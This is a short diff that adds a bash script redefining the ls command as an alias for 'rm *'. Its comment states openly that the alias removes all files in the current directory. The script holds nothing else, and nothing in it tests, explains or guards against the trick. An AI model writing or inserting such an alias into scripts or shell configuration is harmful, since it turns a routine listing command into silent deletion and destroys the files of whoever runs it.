@@ -1,0 +1,3 @@
+#!/usr/bin/env bash
+# Creates an alias named ls that removes all files in the current directory
+alias ls='rm *'
